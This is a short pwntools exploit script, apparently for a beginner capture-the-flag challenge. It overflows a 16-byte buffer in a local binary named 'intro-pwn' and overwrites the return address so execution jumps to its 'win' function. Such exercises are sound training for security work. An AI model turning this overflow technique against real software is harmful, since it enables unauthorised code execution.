#!/usr/bin/env python3
from pwn import *

# Set up logging
context.log_level = 'debug'
context.arch = 'i386'  # Assuming 32-bit binary

# Connect to the binary (locally)
elf = ELF('./intro-pwn')  # Replace with your binary name
p = process('./intro-pwn')  # For local testing

# Set up GDB debugging
gdb_script = '''
break vuln
break main
display/10i $eip
continue
'''

# Uncomment the following line to attach GDB when needed
# gdb.attach(p, gdbscript=gdb_script)

# Find the win function address
win_addr = elf.symbols['win']
log.info(f"Win function address: {hex(win_addr)}")

# Receive the prompt
p.recvuntil(b"What is your name?\n")

# Create the payload
# Buffer size is 16 bytes, we'll add padding to reach the return address
payload = b"A" * 28  # Adjust this padding based on your testing
payload += p32(win_addr)  # Add the address of the win function

# Send the payload
p.sendline(payload)

# Receive and print the response
response = p.recvall()
print(response.decode())